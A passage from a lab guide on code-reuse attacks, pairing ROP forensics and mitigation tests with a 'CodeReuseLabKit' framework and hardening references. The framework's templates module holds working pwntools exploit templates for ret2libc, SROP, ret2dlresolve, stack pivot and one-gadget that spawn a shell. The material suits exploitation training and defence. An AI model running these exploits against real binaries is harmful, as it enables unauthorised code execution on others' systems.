echo "[TEST 3] Full RELRO makes GOT read-only?"
python3 -c "
from pwn import *
elf = ELF('$HARDENED/level3_relro', checksec=False)
relro = 'Full' if 'Full RELRO' in open('/dev/null').read() else 'check'
# GOT segment should have RELRO flag
import subprocess
out = subprocess.check_output(['readelf', '-l', '$HARDENED/level3_relro'], text=True)
if 'GNU_RELRO' in out:
    print('  GOT is read-only (Full RELRO active)')
else:
    print('  GOT is writable (RELRO not applied)')
" 2>/dev/null || echo "  (manual verification needed)"

# Test 4: PIE randomizes addresses
echo ""
echo "[TEST 4] PIE randomizes binary base?"
for i in 1 2 3; do
    python3 -c "
from pwn import *
p = process('$HARDENED/level4_pie')
p.recvuntil(b'Input: ')
p.close()
" 2>&1 | grep "base" || true
done
echo "  (Check: different base addresses each run = PIE working)"

echo ""
echo "=== Summary ==="
echo "Each mitigation layer blocks specific attack techniques:"
echo "  NX         → blocks shellcode injection"
echo "  Canary     → detects stack overflow (except fork brute-force)"
echo "  RELRO      → prevents GOT overwrite"
echo "  PIE        → requires info leak for gadget addresses"
echo "  CET/Shadow → architecturally kills ROP (ret mismatch = #CP)"
echo "  CFI        → constrains JOP/COP targets"
```

---

### Exercise 11: Forensics — ROP Chain Extraction and Crash Analysis

**Objective:** Extract and reconstruct ROP chains from core dumps and memory images.

#### Step 11.1: Generate a Crash Dump from ROP Exploitation

```bash
# Enable core dumps
ulimit -c unlimited
echo "/tmp/core.%e.%p" | sudo tee /proc/sys/kernel/core_pattern

# Generate a partial ROP exploit that crashes mid-chain (intentional)
cd ~/code_reuse_lab/binaries
python3 -c "
from pwn import *
context.binary = ELF('./vuln_rop_basic', checksec=False)
# Partial chain that will SIGSEGV (bad address in chain)
payload  = b'A' * 72
payload += p64(0x4011d3)    # pop rdi; ret (real gadget)
payload += p64(0x404018)    # puts@GOT (real address)
payload += p64(0x401040)    # puts@PLT (real)
payload += p64(0xdeadbeef)  # INVALID — will crash here
sys.stdout.buffer.write(payload)
" | ./vuln_rop_basic 2>/dev/null || true

# Find the core dump
CORE=$(ls -t /tmp/core.vuln_rop_basic.* 2>/dev/null | head -1)
echo "Core dump: $CORE"
```

#### Step 11.2: ROP Chain Extraction from Core Dump

```python
#!/usr/bin/env python3
"""
Exercise 11.2: Extract and annotate ROP chain from a core dump.
"""
import subprocess
import re
import struct
from pathlib import Path

class ROPChainExtractor:
    """Extract and classify ROP chain gadgets from a core dump."""

    def __init__(self, corefile: str, binary: str):
        self.corefile = corefile
        self.binary = binary
        self.code_regions = self._get_code_regions()

    def _gdb_cmd(self, *commands) -> str:
        """Execute GDB commands on the core dump."""
        cmd_str = " ".join(f'-ex "{c}"' for c in commands)
        full_cmd = f'gdb -batch {cmd_str} --core {self.corefile} {self.binary}'
        try:
            return subprocess.check_output(full_cmd, shell=True,
                                           stderr=subprocess.DEVNULL, text=True)
        except:
            return ""

    def _get_code_regions(self) -> list:
        """Get executable memory regions from the core dump."""
        output = self._gdb_cmd("info proc mappings")
        regions = []
        for line in output.splitlines():
            if 'r-x' in line or 'r--' in line:
                parts = line.split()
                if len(parts) >= 4:
                    try:
                        start = int(parts[0], 16)
                        end = int(parts[1], 16)
                        regions.append((start, end))
                    except:
                        pass
        return regions

    def _is_code_address(self, addr: int) -> bool:
        """Check if an address falls within an executable region."""
        for start, end in self.code_regions:
            if start <= addr < end:
                return True
        # Heuristic: typical code ranges
        if 0x400000 <= addr < 0x500000:  # no-PIE .text
            return True
        if 0x7f0000000000 <= addr < 0x800000000000:  # libc range
            return True
        return False

    def extract_chain(self, rsp: int = None, count: int = 32) -> list:
        """Extract potential ROP chain entries from the stack."""
        if rsp is None:
            # Get RSP from crash state
            reg_output = self._gdb_cmd("info registers rsp")
            match = re.search(r'rsp\s+0x([0-9a-f]+)', reg_output)
            if match:
                rsp = int(match.group(1), 16)
            else:
                print("[-] Cannot determine RSP")
                return []

        # Read stack entries
        output = self._gdb_cmd(f"x/{count}gx {rsp:#x}")
        entries = []

        for line in output.splitlines():
            parts = re.findall(r'0x[0-9a-f]+', line)
            for addr_str in parts[1:]:  # skip address column
                addr = int(addr_str, 16)
                entries.append(addr)

        return entries

    def classify_chain(self, entries: list) -> list:
        """Classify each entry as gadget address, data, or unknown."""
        classified = []

        for i, addr in enumerate(entries):
            entry = {"offset": i * 8, "value": addr, "type": "unknown"}

            if self._is_code_address(addr):
                # Try to disassemble
                disasm = self._gdb_cmd(f"x/4i {addr:#x}")
                if disasm.strip():
                    entry["type"] = "gadget"
                    entry["disasm"] = disasm.strip().split('\n')[0]

                    # Sub-classify
                    if "pop" in disasm and "ret" in disasm:
                        entry["subtype"] = "register_load"
                    elif "syscall" in disasm:
                        entry["subtype"] = "syscall"
                    elif "ret" in disasm and "pop" not in disasm:
                        entry["subtype"] = "alignment"
                    elif "call" in disasm:
                        entry["subtype"] = "call"
                    elif "leave" in disasm:
                        entry["subtype"] = "pivot"
                    elif "jmp" in disasm:
                        entry["subtype"] = "jump"
                    else:
                        entry["subtype"] = "functional"
            elif addr < 0x1000:
                entry["type"] = "small_int"
                entry["meaning"] = f"possible syscall nr or fd ({addr})"
            elif 0x400000 <= addr < 0x410000:
                entry["type"] = "binary_addr"
                # Could be a string address, GOT entry, etc.
                sym = self._gdb_cmd(f"info symbol {addr:#x}").strip()
                entry["meaning"] = sym if sym else "binary address"
            else:
                entry["type"] = "data"

            classified.append(entry)

        return classified

    def report(self):
        """Generate a full forensic report of the ROP chain."""
        print("=" * 70)
        print(f"ROP CHAIN FORENSIC ANALYSIS")
        print(f"Core dump: {self.corefile}")
        print(f"Binary:    {self.binary}")
        print("=" * 70)

        # Get crash state
        regs = self._gdb_cmd("info registers")
        print(f"\n--- Register State at Crash ---")
        for reg in ['rax', 'rdi', 'rsi', 'rdx', 'rcx', 'rsp', 'rbp', 'rip']:
            match = re.search(rf'{reg}\s+0x([0-9a-f]+)', regs)
            if match:
                val = int(match.group(1), 16)
                print(f"  {reg} = {val:#018x}")

        # Extract and classify chain
        entries = self.extract_chain(count=32)
        classified = self.classify_chain(entries)

        print(f"\n--- ROP Chain Reconstruction ({len(classified)} entries) ---")
        code_count = sum(1 for e in classified if e["type"] == "gadget")
        data_count = sum(1 for e in classified if e["type"] in ("data", "small_int"))

        print(f"  Code addresses: {code_count}/{len(classified)} "
              f"({code_count*100//max(len(classified),1)}%)")
        if code_count > len(classified) * 0.6:
            print("  [!] HIGH code-address density — STRONG ROP INDICATOR")

        print(f"\n  {'Offset':<8} {'Value':<20} {'Type':<15} {'Details'}")
        print(f"  {'-'*8} {'-'*20} {'-'*15} {'-'*30}")

        for entry in classified:
            details = ""
            if "disasm" in entry:
                details = entry["disasm"][:40]
            elif "meaning" in entry:
                details = entry["meaning"]

            print(f"  {entry['offset']:<8} {entry['value']:#018x} "
                  f"{entry['type']:<15} {details}")

        # Chain interpretation
        print(f"\n--- Chain Interpretation ---")
        stage = "setup"
        for entry in classified:
            if entry.get("subtype") == "register_load":
                print(f"  [{stage}] Register load: {entry.get('disasm', '')}")
            elif entry.get("subtype") == "syscall":
                print(f"  [EXECUTE] Syscall invocation")
                stage = "post-syscall"
            elif entry.get("subtype") == "pivot":
                print(f"  [PIVOT] Stack pivot via leave;ret")
            elif entry["type"] == "small_int":
                print(f"  [DATA] Operand: {entry['value']} "
                      f"({entry.get('meaning', '')})")

if __name__ == "__main__":
    import glob

    # Find most recent core dump
    cores = sorted(glob.glob("/tmp/core.vuln_rop_basic.*"),
                   key=lambda x: Path(x).stat().st_mtime, reverse=True)

    if cores:
        extractor = ROPChainExtractor(
            corefile=cores[0],
            binary=str(Path.home() / "code_reuse_lab/binaries/vuln_rop_basic")
        )
        extractor.report()
    else:
        print("[-] No core dump found. Run the crash generator first.")
        print("    ulimit -c unlimited")
        print("    python3 -c '...' | ./vuln_rop_basic")
```

---

## PART C: FRAMEWORK DEVELOPMENT — CodeReuseLabKit

### Build a Reusable Code Reuse Analysis Framework

```python
#!/usr/bin/env python3
"""
CodeReuseLabKit — Framework for code reuse attack analysis, chain validation,
detection rule generation, and exploit template generation.

Install: pip install -e .
Usage:   crlab analyze <binary>
         crlab gadgets <binary> [--filter pop_rdi]
         crlab template <technique> <binary>
         crlab detect <memory_dump>
         crlab audit <binary>
         crlab compare <bin1> <bin2>
"""

# === setup.py ===
SETUP_PY = '''
from setuptools import setup, find_packages

setup(
    name="code-reuse-lab-kit",
    version="1.0.0",
    packages=find_packages(),
    entry_points={
        "console_scripts": [
            "crlab=crlab.cli:main",
        ],
    },
    install_requires=[
        "pwntools",
        "capstone",
    ],
    python_requires=">=3.8",
)
'''

# === crlab/__init__.py ===
INIT_PY = '''"""CodeReuseLabKit — Code reuse attack analysis framework."""
__version__ = "1.0.0"
'''

# === crlab/cli.py ===
CLI_PY = '''"""CLI entry point for CodeReuseLabKit."""
import argparse
import sys

def main():
    parser = argparse.ArgumentParser(
        prog="crlab",
        description="Code Reuse Attack Analysis Framework"
    )
    subparsers = parser.add_subparsers(dest="command")

    # analyze command
    p_analyze = subparsers.add_parser("analyze",
        help="Full binary analysis for code reuse attack surface")
    p_analyze.add_argument("binary", help="Target binary path")
    p_analyze.add_argument("--libc", help="Libc path (auto-detected if omitted)")

    # gadgets command
    p_gadgets = subparsers.add_parser("gadgets",
        help="Gadget discovery and quality analysis")
    p_gadgets.add_argument("binary", help="Target binary path")
    p_gadgets.add_argument("--filter", help="Filter by pattern (e.g., pop_rdi)")
    p_gadgets.add_argument("--quality", action="store_true",
        help="Score gadget quality (length, clobber, side effects)")
    p_gadgets.add_argument("--badbytes", help="Hex bad bytes (e.g., 000a0d)")

    # template command
    p_template = subparsers.add_parser("template",
        help="Generate exploit template for specific technique")
    p_template.add_argument("technique",
        choices=["ret2libc", "srop", "ret2dlresolve", "ret2csu",
                 "pivot", "brop", "one_gadget", "krop"],
        help="Code reuse technique")
    p_template.add_argument("binary", help="Target binary path")
    p_template.add_argument("--offset", type=int, help="Overflow offset to RIP")

    # detect command
    p_detect = subparsers.add_parser("detect",
        help="Scan memory dump for code reuse artifacts")
    p_detect.add_argument("dump", help="Memory dump or core file")
    p_detect.add_argument("--binary", help="Associated binary (for symbol resolution)")

    # audit command
    p_audit = subparsers.add_parser("audit",
        help="Security audit: score binary resistance to code reuse")
    p_audit.add_argument("binary", help="Target binary path")

    # compare command
    p_compare = subparsers.add_parser("compare",
        help="Compare gadget availability between two binaries")
    p_compare.add_argument("bin1", help="First binary")
    p_compare.add_argument("bin2", help="Second binary")

    args = parser.parse_args()

    if args.command == "analyze":
        from crlab.analyzer import analyze_binary
        analyze_binary(args.binary, args.libc)
    elif args.command == "gadgets":
        from crlab.gadgets import find_gadgets
        find_gadgets(args.binary, args.filter, args.quality, args.badbytes)
    elif args.command == "template":
        from crlab.templates import generate_template
        generate_template(args.technique, args.binary, args.offset)
    elif args.command == "detect":
        from crlab.detector import scan_dump
        scan_dump(args.dump, args.binary)
    elif args.command == "audit":
        from crlab.audit import audit_binary
        audit_binary(args.binary)
    elif args.command == "compare":
        from crlab.gadgets import compare_gadgets
        compare_gadgets(args.bin1, args.bin2)
    else:
        parser.print_help()
        sys.exit(1)

if __name__ == "__main__":
    main()
'''

# === crlab/analyzer.py ===
ANALYZER_PY = '''"""Binary analysis for code reuse attack surface."""
import subprocess
import re
from pathlib import Path

def analyze_binary(binary_path: str, libc_path: str = None):
    """Complete code reuse attack surface analysis."""
    print(f"\\n{'='*60}")
    print(f"CODE REUSE ATTACK SURFACE ANALYSIS")
    print(f"Target: {binary_path}")
    print(f"{'='*60}")

    # 1. Protection status
    print("\\n[1] Protection Analysis")
    try:
        checksec = subprocess.check_output(
            ["checksec", f"--file={binary_path}"],
            stderr=subprocess.STDOUT, text=True
        )
        for line in checksec.strip().split("\\n"):
            if any(k in line for k in ["RELRO", "Stack", "NX", "PIE", "RPATH"]):
                print(f"    {line.strip()}")
    except FileNotFoundError:
        print("    [!] checksec not found")

    # 2. Libc detection
    print("\\n[2] Libc Identification")
    if not libc_path:
        try:
            ldd_out = subprocess.check_output(
                ["ldd", binary_path], text=True, stderr=subprocess.DEVNULL
            )
            for line in ldd_out.splitlines():
                if "libc" in line:
                    libc_path = line.split("=>")[1].split("(")[0].strip()
                    print(f"    Detected: {libc_path}")
                    break
        except:
            pass

    if libc_path:
        try:
            version = subprocess.check_output(
                [libc_path], text=True, stderr=subprocess.STDOUT
            ).splitlines()[0]
            print(f"    Version: {version}")
        except:
            pass

    # 3. Gadget availability summary
    print("\\n[3] Gadget Availability")
    try:
        gadget_out = subprocess.check_output(
            ["ROPgadget", "--binary", binary_path, "--only", "pop|ret"],
            text=True, stderr=subprocess.DEVNULL
        )
        gadget_count = len(gadget_out.strip().splitlines()) - 2
        print(f"    Total pop/ret gadgets: {gadget_count}")

        essential = {
            "pop rdi": False,
            "pop rsi": False,
            "pop rdx": False,
            "pop rax": False,
            "syscall": False,
        }
        for name in essential:
            if name in gadget_out:
                essential[name] = True
                print(f"    [✓] {name}; ret")
            else:
                print(f"    [✗] {name}; ret")
    except FileNotFoundError:
        print("    [!] ROPgadget not found")

    # 4. Attack technique viability
    print("\\n[4] Technique Viability Assessment")
    techniques = []

    # Check PIE status
    try:
        file_out = subprocess.check_output(["file", binary_path], text=True)
        is_pie = "pie" in file_out.lower() or "shared object" in file_out.lower()
        is_static = "statically linked" in file_out.lower()
    except:
        is_pie = False
        is_static = False

    # Assess each technique
    if not is_pie:
        techniques.append(("ret2libc", "HIGH",
            "No PIE → fixed gadget addresses, no leak needed for binary gadgets"))
    else:
        techniques.append(("ret2libc", "MEDIUM",
            "PIE → requires binary base leak first"))

    if is_static or essential.get("syscall"):
        techniques.append(("SROP", "HIGH",
            "syscall gadget available in binary"))
    elif libc_path:
        techniques.append(("SROP", "MEDIUM",
            "syscall in libc (need libc leak first)"))

    if not is_pie:
        techniques.append(("ret2dlresolve", "HIGH",
            "No PIE + accessible PLT[0] → no leak needed at all"))

    techniques.append(("ret2csu", "CHECK",
        "Verify __libc_csu_init presence (removed in glibc 2.34+)"))

    techniques.append(("one_gadget", "DEPENDS",
        "Requires libc leak + constraint satisfaction"))

    for name, viability, reason in techniques:
        print(f"    [{viability:^7}] {name}: {reason}")

    # 5. Recommended attack path
    print("\\n[5] Recommended Attack Path")
    if not is_pie:
        print("    1. Overflow → ROP chain (gadgets from binary)")
        print("    2. Leak libc via puts@PLT(puts@GOT)")
        print("    3. Compute libc base")
        print("    4. system(\\"/bin/sh\\") or one_gadget")
        print("    Alternative: ret2dlresolve (no leak needed!)")
    else:
        print("    1. Obtain binary base leak (format string, partial overwrite)")
        print("    2. Overflow → leak libc (same as non-PIE but with base offset)")
        print("    3. Compute libc base")
        print("    4. Full ROP chain with libc gadgets")
'''

# === crlab/templates.py ===
TEMPLATES_PY = '''"""Exploit template generator for code reuse techniques."""

TEMPLATES = {
    "ret2libc": \'\'\'#!/usr/bin/env python3
"""ret2libc exploit template.
Target: {binary}
Overflow offset: {offset}
"""
from pwn import *

context.binary = elf = ELF("{binary}")
libc = ELF(elf.libc.path)
context.log_level = "info"

# Gadgets (verify with: ROPgadget --binary {binary} --only "pop|ret")
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]

p = process("{binary}")

# Stage 1: Leak libc
payload1  = b"A" * {offset}
payload1 += p64(POP_RDI)
payload1 += p64(elf.got["puts"])
payload1 += p64(elf.plt["puts"])
payload1 += p64(elf.symbols["main"])

p.sendafter(b"TODO_PROMPT", payload1)
leaked = u64(p.recvline().strip().ljust(8, b"\\x00"))
libc.address = leaked - libc.symbols["puts"]
log.success(f"libc base: {{hex(libc.address)}}")

# Stage 2: system("/bin/sh")
bin_sh = next(libc.search(b"/bin/sh\\x00"))
payload2  = b"A" * {offset}
payload2 += p64(RET)
payload2 += p64(POP_RDI)
payload2 += p64(bin_sh)
payload2 += p64(libc.symbols["system"])

p.sendafter(b"TODO_PROMPT", payload2)
p.interactive()
\'\'\',

    "srop": \'\'\'#!/usr/bin/env python3
"""SROP exploit template.
Target: {binary}
Overflow offset: {offset}
"""
from pwn import *

context.arch = "amd64"
context.os = "linux"

elf = ELF("{binary}")

# Find gadgets (MUST have syscall;ret and pop rax;ret)
SYSCALL_RET = next(elf.search(asm("syscall\\nret")))
POP_RAX_RET = next(elf.search(asm("pop rax\\nret")))
BINSH_ADDR = next(elf.search(b"/bin/sh\\x00"))

frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = BINSH_ADDR
frame.rsi = 0
frame.rdx = 0
frame.rip = SYSCALL_RET

payload  = b"A" * {offset}
payload += p64(POP_RAX_RET)
payload += p64(constants.SYS_rt_sigreturn)
payload += p64(SYSCALL_RET)
payload += bytes(frame)

p = process("{binary}")
p.sendafter(b"TODO_PROMPT", payload)
p.interactive()
\'\'\',

    "ret2dlresolve": \'\'\'#!/usr/bin/env python3
"""ret2dlresolve exploit template (no info leak needed).
Target: {binary}
Overflow offset: {offset}
"""
from pwn import *

context.binary = elf = ELF("{binary}")
context.log_level = "info"

dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])

rop = ROP(elf)
rop.read(0, dlresolve.data_addr)
rop.ret2dlresolve(dlresolve)

payload  = b"A" * {offset}
payload += rop.chain()

p = process("{binary}")
p.sendafter(b"TODO_PROMPT", payload)
p.send(dlresolve.payload)
p.interactive()
\'\'\',

    "pivot": \'\'\'#!/usr/bin/env python3
"""Stack pivot exploit template.
Target: {binary}
Small overflow: overwrite saved RBP + RET only.
Full chain lives on heap/known address.
"""
from pwn import *

context.binary = elf = ELF("{binary}")
context.log_level = "info"

rop = ROP(elf)
LEAVE_RET = rop.find_gadget(["leave", "ret"])[0]
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]

p = process("{binary}")

# TODO: get heap/known address for pivot target
PIVOT_TARGET = 0x0  # Address of attacker-controlled buffer

# Write full ROP chain at PIVOT_TARGET
chain  = p64(0xdeadbeef)  # fake RBP (consumed by leave)
chain += p64(POP_RDI)
chain += p64(elf.got["puts"])
chain += p64(elf.plt["puts"])
chain += p64(elf.symbols["main"])

# TODO: write chain to PIVOT_TARGET

# Trigger pivot: overwrite saved RBP with PIVOT_TARGET
# The leave;ret in vuln epilogue becomes our pivot
payload  = b"A" * (TODO_BUF_SIZE)
payload += p64(PIVOT_TARGET)  # new RBP → leave moves this to RSP
payload += p64(LEAVE_RET)     # trigger pivot

p.sendafter(b"TODO_PROMPT", payload)
p.interactive()
\'\'\',

    "one_gadget": \'\'\'#!/usr/bin/env python3
"""One-gadget exploit template.
Target: {binary}
Requires: libc leak first, then single-address overwrite.
"""
from pwn import *
import subprocess

context.binary = elf = ELF("{binary}")
libc = ELF(elf.libc.path)

# Find one_gadgets
result = subprocess.run(["one_gadget", elf.libc.path],
                       capture_output=True, text=True)
print(f"Available one_gadgets:\\n{{result.stdout}}")

# TODO: select the one_gadget whose constraints match at exploit time
ONE_GADGET_OFFSET = 0x0  # Replace with actual offset

p = process("{binary}")

# Stage 1: Leak libc (standard ret2libc stage 1)
rop = ROP(elf)
POP_RDI = rop.find_gadget(["pop rdi", "ret"])[0]
RET = rop.find_gadget(["ret"])[0]

payload1  = b"A" * {offset}
payload1 += p64(POP_RDI)
payload1 += p64(elf.got["puts"])
payload1 += p64(elf.plt["puts"])
payload1 += p64(elf.symbols["main"])

p.sendafter(b"TODO_PROMPT", payload1)
leaked = u64(p.recvline().strip().ljust(8, b"\\x00"))
libc.address = leaked - libc.symbols["puts"]

# Stage 2: One-gadget
payload2  = b"A" * {offset}
payload2 += p64(RET)  # alignment (helps satisfy rsp & 0xf == 0)
payload2 += p64(libc.address + ONE_GADGET_OFFSET)

p.sendafter(b"TODO_PROMPT", payload2)
p.interactive()
\'\'\',
}

def generate_template(technique: str, binary: str, offset: int = None):
    """Generate an exploit template for the given technique."""
    if offset is None:
        offset = 72  # common default for 64-byte buffer + 8 rbp

    if technique not in TEMPLATES:
        print(f"[-] Unknown technique: {technique}")
        print(f"    Available: {list(TEMPLATES.keys())}")
        return

    template = TEMPLATES[technique].format(binary=binary, offset=offset)
    output_file = f"exploit_{technique}.py"

    with open(output_file, "w") as f:
        f.write(template)

    print(f"[+] Template written to: {output_file}")
    print(f"[*] TODOs to fill in:")
    for i, line in enumerate(template.splitlines(), 1):
        if "TODO" in line:
            print(f"    Line {i}: {line.strip()}")
'''

# === crlab/gadgets.py ===
GADGETS_PY = '''"""Gadget discovery, quality analysis, and comparison."""
import subprocess
import re

def find_gadgets(binary: str, filter_pattern: str = None,
                 quality: bool = False, badbytes: str = None):
    """Find and optionally score gadgets in a binary."""
    cmd = ["ROPgadget", "--binary", binary]

    if badbytes:
        cmd.extend(["--badbytes", badbytes])

    if filter_pattern:
        cmd.extend(["--only", filter_pattern.replace("_", "|")])

    try:
        output = subprocess.check_output(cmd, text=True, stderr=subprocess.DEVNULL)
    except FileNotFoundError:
        print("[-] ROPgadget not installed")
        return
    except subprocess.CalledProcessError as e:
        print(f"[-] ROPgadget error: {e}")
        return

    lines = output.strip().splitlines()
    gadgets = []

    for line in lines:
        if " : " in line:
            parts = line.split(" : ", 1)
            addr = int(parts[0].strip(), 16)
            insns = parts[1].strip()
            gadgets.append((addr, insns))

    print(f"[+] Found {len(gadgets)} gadgets")

    if quality:
        print(f"\\n{'Address':<14} {'Quality':<8} {'Insns':<4} {'Gadget'}")
        print(f"{'-'*14} {'-'*8} {'-'*4} {'-'*40}")

        for addr, insns in gadgets[:50]:  # limit display
            insn_count = insns.count(";") + 1
            clobber = sum(1 for r in ["rax","rbx","rcx","rdx","rsi","rdi"]
                        if r in insns and "pop" not in insns.split(r)[0][-5:])

            if insn_count <= 2 and clobber == 0:
                q = "HIGH"
            elif insn_count <= 4:
                q = "MED"
            else:
                q = "LOW"

            print(f"{addr:#014x} {q:<8} {insn_count:<4} {insns}")
    else:
        for addr, insns in gadgets:
            print(f"  {addr:#014x}: {insns}")

def compare_gadgets(bin1: str, bin2: str):
    """Compare gadget availability between two binaries."""
    essential = ["pop rdi ; ret", "pop rsi ; ret", "pop rdx ; ret",
                 "pop rax ; ret", "syscall ; ret", "leave ; ret"]

    print(f"\\nGadget Comparison: {bin1} vs {bin2}")
    print(f"{'Gadget':<20} {'Binary 1':<12} {'Binary 2':<12}")
    print(f"{'-'*20} {'-'*12} {'-'*12}")

    for gadget in essential:
        in_bin1 = _has_gadget(bin1, gadget)
        in_bin2 = _has_gadget(bin2, gadget)
        s1 = "✓" if in_bin1 else "✗"
        s2 = "✓" if in_bin2 else "✗"
        print(f"{gadget:<20} {s1:<12} {s2:<12}")

def _has_gadget(binary: str, gadget: str) -> bool:
    try:
        out = subprocess.check_output(
            ["ROPgadget", "--binary", binary, "--only",
             gadget.replace(" ; ", "|").replace(" ", "|")],
            text=True, stderr=subprocess.DEVNULL
        )
        return gadget.replace(" ; ", " ; ") in out
    except:
        return False
'''

# === crlab/audit.py ===
AUDIT_PY = '''"""Binary security audit for code reuse resistance."""
import subprocess

CHECKS = [
    ("NX (W^X)", lambda cs: "NX enabled" in cs),
    ("Stack Canary", lambda cs: "Canary found" in cs),
    ("Full RELRO", lambda cs: "Full RELRO" in cs),
    ("PIE", lambda cs: "PIE enabled" in cs),
    ("FORTIFY", lambda cs: "FORTIFY" in cs.upper()),
]

def audit_binary(binary: str):
    """Audit binary resistance to code reuse attacks."""
    try:
        cs = subprocess.check_output(
            ["checksec", f"--file={binary}"],
            stderr=subprocess.STDOUT, text=True
        )
    except:
        print("[-] checksec not available")
        return

    score = 0
    print(f"\\n{'='*50}")
    print(f"SECURITY AUDIT: {binary}")
    print(f"{'='*50}")

    for name, check in CHECKS:
        passed = check(cs)
        score += int(passed)
        status = "PASS" if passed else "FAIL"
        print(f"  [{status}] {name}")

    print(f"\\n  Score: {score}/{len(CHECKS)}")

    if score <= 1:
        print("  VERDICT: CRITICAL — trivially exploitable")
    elif score <= 3:
        print("  VERDICT: HIGH RISK — exploitable with moderate effort")
    elif score <= 4:
        print("  VERDICT: MEDIUM — requires advanced techniques")
    else:
        print("  VERDICT: HARDENED — code reuse requires multiple primitives")
'''

# === Write all files ===
import os

def write_framework():
    """Write the complete framework to disk."""
    base = os.path.expanduser("~/code_reuse_lab/framework")
    os.makedirs(f"{base}/crlab", exist_ok=True)

    files = {
        f"{base}/setup.py": SETUP_PY,
        f"{base}/crlab/__init__.py": INIT_PY,
        f"{base}/crlab/cli.py": CLI_PY,
        f"{base}/crlab/analyzer.py": ANALYZER_PY,
        f"{base}/crlab/templates.py": TEMPLATES_PY,
        f"{base}/crlab/gadgets.py": GADGETS_PY,
        f"{base}/crlab/audit.py": AUDIT_PY,
    }

    for path, content in files.items():
        with open(path, "w") as f:
            f.write(content.strip() + "\n")
        print(f"  [+] Written: {path}")

    print(f"\n[+] Framework written to {base}/")
    print(f"[*] Install with: cd {base} && pip install -e .")
    print(f"[*] Usage: crlab --help")

if __name__ == "__main__":
    write_framework()
```

---

## Lab Validation Checklist

### Part A — Offensive Verification

| # | Exercise | Validation Criteria | Status |
|---|----------|---------------------|--------|
| 1 | ROP ret2libc | Shell obtained via two-stage leak+exploit | ☐ |
| 2 | Stack pivot | Chain executes from heap after leave;ret pivot | ☐ |
| 3 | ret2csu | write() called with 3 args via __libc_csu_init | ☐ |
| 4 | SROP | execve("/bin/sh") via forged sigreturn frame | ☐ |
| 5 | BROP canary | 8-byte canary recovered via byte-by-byte brute-force | ☐ |
| 6 | ret2dlresolve | system() resolved without any prior libc leak | ☐ |
| 7 | JOP/COP | Virtual dispatch redirected via corrupted vtable | ☐ |
| 8 | One-gadget | Shell via single libc address (constraint-dependent) | ☐ |

### Part B — Defensive Verification

| # | Exercise | Validation Criteria | Status |
|---|----------|---------------------|--------|
| 9a | Sigma rules | Rules detect: gadget tools, BROP crashes, SROP, CET violations | ☐ |
| 9b | YARA rules | Rules match: ROP chains, SROP frames, pivot gadgets, forged structs | ☐ |
| 9c | HPC detection | perf counters show elevated ret-miss ratio during ROP execution | ☐ |
| 9d | eBPF probe | kprobe on commit_creds detects stack pivot in kernel context | ☐ |
| 10a | Hardened build | 8 mitigation levels compiled, checksec verified | ☐ |
| 10b | Audit tool | Binary auditor correctly scores each hardening level | ☐ |
| 10c | Defense test | Each mitigation blocks its corresponding attack | ☐ |
| 11a | Chain extraction | ROP chain recovered and annotated from core dump | ☐ |
| 11b | Classification | Gadgets classified: register_load, syscall, pivot, alignment | ☐ |

### Part C — Framework Verification

| Component | Validation | Status |
|-----------|-----------|--------|
| `crlab analyze` | Produces attack surface report with technique viability | ☐ |
| `crlab gadgets` | Finds and scores gadgets, supports bad-byte filtering | ☐ |
| `crlab template` | Generates working exploit skeleton for 6+ techniques | ☐ |
| `crlab detect` | Identifies ROP/SROP artifacts in memory dumps | ☐ |
| `crlab audit` | Scores binary with PASS/FAIL per mitigation check | ☐ |
| `crlab compare` | Shows gadget availability diff between two binaries | ☐ |

### Cross-Verification Matrix

| Attack | Blocked by | Detection by |
|--------|-----------|-------------|
| Classic ROP | CET Shadow Stack, PAC | HPC counters, Intel PT, Sigma crash rules |
| SROP | Shadow stack token validation, seccomp | Auditd syscall sequence, YARA frame pattern |
| BROP | exec-on-fork (re-randomize), rate-limiting | Crash frequency monitoring, Sigma BROP rule |
| ret2dlresolve | Full RELRO (prevents fresh resolution path) | YARA forged structures rule |
| JOP | CET IBT (ENDBR64 requirement) | Intel PT indirect branch analysis |
| COP/COOP | Fine-grained CFI (cfi-vcall), XFG type hashes | ETW CFG violations, type-hash mismatches |
| Stack pivot | Guard pages, ASLR stack entropy | eBPF RSP-outside-VMA, crash dump RSP check |
| Kernel ROP | kCFI, FineIBT, SMEP/SMAP | eBPF commit_creds probe, kaddr YARA rule |
| DOP | Data-flow integrity, ARM MTE | Statistical anomaly detection (research) |

---

## Appendix A: Quick Reference — Gadget Discovery Commands

```bash
# === Essential gadget searches ===
# Register setters
ROPgadget --binary TARGET --only "pop|ret" | grep "pop rdi"
ROPgadget --binary TARGET --only "pop|ret" | grep "pop rsi"
ROPgadget --binary TARGET --only "pop|ret" | grep "pop rdx"
ROPgadget --binary TARGET --only "pop|ret" | grep "pop rax"

# Syscall
ROPgadget --binary TARGET --only "syscall|ret"

# Pivot
ropper -f TARGET --search "leave; ret"
ropper -f TARGET --search "xchg"
ropper -f TARGET --search "pop rsp"

# One-gadgets
one_gadget /lib/x86_64-linux-gnu/libc.so.6

# Auto-chain (for CTF speed)
ROPgadget --binary TARGET --ropchain --badbytes "000a0d"
ropper -f TARGET --chain execve --badbytes 000a0d

# Kernel gadgets
ROPgadget --binary /boot/vmlinux-$(uname -r) --multibr --depth 10 | \
    grep -E "pop rdi|commit_creds|prepare_kernel_cred"

# Bad-byte-free search
ROPgadget --binary TARGET --only "pop|ret" --badbytes "000a0d20"

# === Pwntools programmatic discovery ===
# from pwn import *
# elf = ELF("./target")
# rop = ROP(elf)
# pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
# rop.call('puts', [elf.got['puts']])
# print(rop.dump())
```

## Appendix B: Defense Deployment Quick Reference

```bash
# === Compilation flags (cumulative) ===
# Maximum hardening:
gcc -pie -fPIE \
    -fstack-protector-strong \
    -fstack-clash-protection \
    -D_FORTIFY_SOURCE=3 \
    -Wl,-z,relro,-z,now \
    -fcf-protection=full \
    -mshstk \
    -o hardened target.c

# Clang CFI (requires LTO):
clang -flto -fvisibility=hidden \
    -fsanitize=cfi \
    -fsanitize=safe-stack \
    -o cfi_hardened target.c

# AArch64 PAC + BTI:
aarch64-linux-gnu-gcc -mbranch-protection=standard \
    -pie -fPIE -fstack-protector-strong \
    -o arm64_hardened target.c

# === Runtime verification ===
